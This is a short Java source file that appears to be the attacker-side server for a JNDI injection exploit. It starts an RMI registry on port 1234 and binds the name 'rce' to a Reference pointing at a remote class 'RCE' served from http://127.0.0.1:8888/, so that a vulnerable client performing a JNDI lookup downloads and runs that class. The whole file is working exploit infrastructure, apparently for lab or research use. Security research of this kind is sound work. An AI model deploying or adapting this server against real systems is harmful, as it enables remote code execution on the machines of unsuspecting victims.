import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) {
        try {
            Registry registry = LocateRegistry.createRegistry(1234);
            Reference reference = new Reference("RCE", "RCE", "http://127.0.0.1:8888/");
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("rce", referenceWrapper);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
